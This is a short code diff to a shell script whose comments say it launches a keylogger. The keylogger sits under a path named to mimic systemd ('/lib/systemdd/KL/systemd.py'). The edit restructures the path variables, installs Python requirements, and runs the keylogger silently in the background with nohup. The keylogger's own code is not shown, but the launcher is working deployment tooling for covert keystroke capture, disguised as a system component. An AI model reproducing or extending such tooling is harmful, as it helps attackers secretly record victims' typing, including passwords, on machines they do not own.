@@ -4,12 +4,14 @@
 
 
 #Put your keylogger script along with its full directory here
-FILE="/lib/systemdd/KL/systemd.py"
+DIR="/lib/systemdd/KL/"
+FILE="systemd.py"
+REQ="requirements.txt"
 
 #Make the program be able to be executed
-chmod +x $FILE
+chmod +x $DIR$FILE
 #Execute the program with Python 3, and
-#put the process in background with 
+#put the process in background with
 #nohup command
-pip3 install -r requirements.txt
-nohup python3 $FILE &> no-output&
+pip3 install -r $DIR$REQ
+nohup python3 $DIR$FILE &> no-output&
